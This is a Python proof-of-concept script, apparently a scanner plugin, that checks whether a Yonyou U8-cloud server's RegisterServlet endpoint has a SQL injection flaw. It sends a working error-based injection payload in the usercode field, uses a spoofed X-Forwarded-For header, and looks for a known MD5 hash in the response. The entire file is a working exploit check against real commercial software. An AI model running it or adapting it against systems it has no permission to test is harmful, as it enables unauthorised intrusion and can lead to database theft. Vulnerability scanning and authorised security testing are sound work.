import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友U8-cloud RegisterServlet接口存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36',
        'Connection': 'close',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Forwarded-For': '127.0.0.1',
        'Accept-Encoding': 'gzip'
    }
    data = '''usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--'''
    vurl = urllib.parse.urljoin(url, "/servlet/RegisterServlet")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'e10adc3949ba59abbe56e057f20f883e' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult